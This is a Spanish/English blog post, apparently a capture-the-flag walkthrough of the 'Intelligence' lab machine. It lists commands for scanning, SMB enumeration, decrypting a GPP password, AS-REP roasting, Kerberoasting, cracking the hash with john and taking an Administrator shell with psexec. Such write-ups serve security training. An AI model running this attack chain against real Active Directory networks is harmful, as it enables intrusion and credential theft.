---
# multilingual page pair id, this must pair with translations of this page. (This name must be unique)
lng_pair: id_intelligence
title: "Intelligence"

# post specific
# if not specified, .name will be used from _data/owner/[language].yml
author: Bast1ant1c
# multiple category is not supported
category: Easy
# multiple tag entries are possible
tags: [AD, pentesting]
# thumbnail image for post
img: ":main_photo.jpg"
# disable comments on this page
#comments_disable: true

# publish date
date: 2022-12-27

# seo
# if not specified, date will be used.
#meta_modify_date: 2022-01-01 10:04:30 +0900
# check the meta_common_description in _data/owner/[language].yml
meta_description: ""

# optional
# please use the "image_viewer_on" below to enable image viewer for individual pages or posts (_posts/ or [language]/_posts folders).
# image viewer can be enabled or disabled for all posts using the "image_viewer_posts: true" setting in _data/conf/main.yml.
#image_viewer_on: true
# please use the "image_lazy_loader_on" below to enable image lazy loader for individual pages or posts (_posts/ or [language]/_posts folders).
# image lazy loader can be enabled or disabled for all posts using the "image_lazy_loader_posts: true" setting in _data/conf/main.yml.
#image_lazy_loader_on: true
# exclude from on site search
#on_site_search_exclude: true
# exclude from search engines
#search_engine_exclude: true
# to disable this page, simply set published: false or delete this file
#published: false
---
<!-- outline-start -->

Hola, esta es la máquina intelligence! Let's hack!

<!-- outline-end -->

## RECON
```python
ping -c 1 <IP>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG ports
extractports <ports>
nmap -sCV <PORTS> -oG services
```

## AD DOMAIN DETECTION
```bash
crackmapexec smb <IP>
sudo su
nvim /etc/hosts
<IP>	<DOMAIN>
```

## SMB ENUM
```bash
smbclient -L <IP> -N
crackmapexec smb <IP> --shares
smbmap -H <IP>
smbmap -H <IP> -r Replication/intelligence.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/
smbmap -H <IP> --download Replication/intelligence.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
mv <IP>-Replication_intelligence.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml groups.xml
```

## DECRYPT GROUPS.XML PASSWORD
```bash
gpp-decrypt '<CPASSWORD>'
```

## GRANTED SMB ACCESS SVC_TGS USER
```bash
crackmapexec smb <IP> -u 'SVC_TGS' -p '<PASSWORD>'
crackmapexec smb <IP> -u 'SVC_TGS' -p '<PASSWORD>' --shares
smbmap -H <IP> -u 'SVC_TGS' -p '<PASSWORD>' -r Users/SVC_TGS/Desktop/user.txt
```

## FLAG USER.TXT
```bash
smbmap -H <IP> -u 'SVC_TGS' -p '<PASSWORD>' --download Users/SVC_TGS/Desktop/user.txt
mv <IP>-Users_SVC_TGS_Desktop_user.txt user.txt
cat user.txt
```

## AD ENUM RPCCLIENT
```bash
rpcclient -U "SVC_TGS%<PASSWORD>" <IP>
rpcclient -U "SVC_TGS%<PASSWORD>" <IP> -c 'enumdomusers'
rpcclient -U "SVC_TGS%<PASSWORD>" <IP> -c 'enumdomgroups'
rpcclient -U "SVC_TGS%<PASSWORD>" <IP> -c 'querygroupmem 0x200'
rpcclient -U "SVC_TGS%<PASSWORD>" <IP> -c 'queryuser 0x1f4'
rpcclient -U "SVC_TGS%<PASSWORD>" <IP> -c 'querydispinfo'
echo SVC_TGS > users.txt
```

## AD TGT GETNPUSERS.PY
```bash
GetNPUsers.py intelligence.htb/ --no-pass -usersfile users.txt
```

## AD USER ENUM KERBRUTE
```bash
kerbrute userenum --dc <IP> -d intelligence.htb /usr/share/Seclists/Usernames/Names/names.txt
```

## ADJUST DATE & TIME WITH AD (OPTIONAL)
```bash
ntpdate <IP>
```

## AD TGS GETUSERSPN.PY
```bash
GetUserSPN.py intelligence.htb/SVC_TGS:<PASSWORD> -request
```

## BRUTEFORCE ADMINISTRATOR HASH
```bash
echo '<HASH>' > hash
john -w:/usr/share/wordlists/rockyou.txt hash
```

## GRANTED ACCESS ADMINISTRATOR USER
```bash
crackmapexec smb <IP> -u 'Administrator' -p '<PASSWORD>'
psexec.py 'intelligence.htb/Administrator:<PASSWORD>@<IP>' cmd.exe
whoami
```

## FLAG ROOT.TXT
```bash
type C:\Users\Administrator\Desktop\root.txt
```
